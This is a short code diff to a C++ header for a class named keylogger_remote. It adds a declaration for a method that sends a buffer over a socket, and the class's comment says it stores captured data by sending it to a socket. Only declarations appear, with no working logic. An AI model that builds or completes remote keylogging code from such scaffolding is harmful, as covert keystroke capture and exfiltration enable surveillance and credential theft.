@@ -31,6 +31,11 @@ class keylogger_remote : virtual public keylogger
       * Store data by sending them to a_socket
       */
   		virtual void store();
+
+      /*
+      * Send message p_buffer with size p_bytes_to_send to p_socket
+      */
+      virtual int send_complete(int p_socket, void** p_buffer, size_t p_bytes_to_send);
   };
 
 #endif
